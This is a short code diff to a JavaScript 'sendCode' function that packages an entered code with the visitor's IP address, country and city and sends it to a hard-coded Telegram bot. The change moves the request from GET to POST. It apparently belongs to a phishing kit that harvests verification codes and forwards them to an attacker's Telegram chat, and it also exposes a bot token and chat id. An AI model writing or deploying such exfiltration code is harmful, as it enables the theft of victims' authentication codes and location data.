@@ -171,13 +171,23 @@ function sendCode() {
         const message1 = `%0A<strong>Code: </strong><code>${code1}</code>\n%0A<strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>\n%0A<strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)\n%0A<strong>City: </strong><code>${IpAddress.city}</code>`;
 
         NUMBER_TIME_SEND_CODE++;
-        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-        const chatId = '-1002416068664'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
-        const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
+        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
+        const chatId = '-1002416068664';
+        const message = message1;
 
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        fetch(telegramUrl)
+        fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'html'
+            })
+        })
             .then((response) => {
                 if (!response.ok) {
                     throw new Error('Network response was not ok');
